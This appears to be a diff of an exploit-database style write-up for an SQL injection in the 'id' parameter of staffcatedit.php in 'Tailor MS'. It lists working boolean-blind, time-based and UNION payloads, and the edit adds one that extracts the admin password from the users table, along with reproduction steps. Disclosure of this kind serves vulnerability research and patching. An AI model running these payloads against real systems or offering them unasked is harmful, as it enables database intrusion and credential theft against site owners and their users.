@@ -1,4 +1,4 @@
-# Exploit Title: Tailor MS – SQL Injection in staffcatedit.php (`http://localhost/tailor/staffcatedit.php?id=1`)
+# Exploit Title: Tailor MS – SQL Injection in staffcatedit.php (`http://localhost:8000/staffcatedit.php?id=1`)
 
 **Date:** 2025-08-11  
 **Exploit Author:** Anonymous  
@@ -20,31 +20,31 @@ A SQL Injection vulnerability exists in the `staffcatedit.php` endpoint of **Tai
 
 ### Affected Endpoint
 
-- **URL:** `http://localhost/tailor/staffcatedit.php?id=1`
+- **URL:** `http://localhost:8000/staffcatedit.php?id=1`
 - **HTTP Method:** GET
 - **Vulnerable File:** `staffcatedit.php`
 - **Parameter:** `id`
 - **Vector Location:** GET
 
-### Injection Techniques (as identified by sqlmap)
+### Injection Techniques
 - **Type:** boolean-based blind
   - **Title:** AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
-  - **Payload:** `id=1' AND 1744=(SELECT (CASE WHEN (1744=1744) THEN 1744 ELSE (SELECT 6876 UNION SELECT 8378) END))-- -`
+  - **Payload:** `id=1' AND 1234=(SELECT (CASE WHEN (1234=1234) THEN 1234 ELSE (SELECT 1111 UNION SELECT 2222) END))-- -`
 - **Type:** time-based blind
   - **Title:** MySQL >= 5.0.12 AND time-based blind (query SLEEP)
-  - **Payload:** `id=1' AND (SELECT 3118 FROM (SELECT(SLEEP(5)))WOKU)-- rnGa`
-- **Type:** UNION query
-  - **Title:** Generic UNION query (NULL) - 1 column
-  - **Payload:** 
-```
-id=-2131' UNION ALL SELECT CONCAT(0x7162786b71,0x597763626965524d6c434e48745164796b6f706658545378754d48424e67714e6d73597a4d566d6f,0x716b786271)-- -
-```
+  - **Payload:** `id=1' AND (SELECT 5555 FROM (SELECT(SLEEP(5)))abcd)-- efgh`
+- **Type:** UNION query (exfiltration)
+  - **Title:** UNION query to extract admin password
+  - **Payload:**  
+    ```
+    http://localhost:8000/staffcatedit.php?id=-1' union select password from users where username='admin'-- -
+    ```
 
 
 
-## Proof of Concept (Burp Repeater)
+## Proof of Concept (Firefox Screenshot)
 
-![burp-repeater-poc](poc.png)
+![exploit](exploit.png)
 
 ## SQLMap Summary
 
@@ -64,7 +64,7 @@ The vulnerable parameter is reflected into the SQL statement without proper vali
 
 ## Steps to Reproduce
 
-1. Browse to `http://localhost/tailor/staffcatedit.php?id=1`.  
+1. Browse to `http://localhost:8000/staffcatedit.php?id=1`.  
 2. Intercept the request and inject the provided payload(s) into parameter `staffcatedit.php?&<param>=...`.  
 3. Observe conditional responses / time delays / injected row reflections per technique above.  
 4. Confirm DBMS fingerprinting and data extraction as permitted by the app’s DB privileges.
@@ -74,7 +74,6 @@ The vulnerable parameter is reflected into the SQL statement without proper vali
 ![vulnerable-code](code_snippet.png)
 
 
-References
-OWASP: SQL Injection Prevention Cheat Sheet
-
+References  
+OWASP: SQL Injection Prevention Cheat Sheet  
 CWE-89: SQL Injection
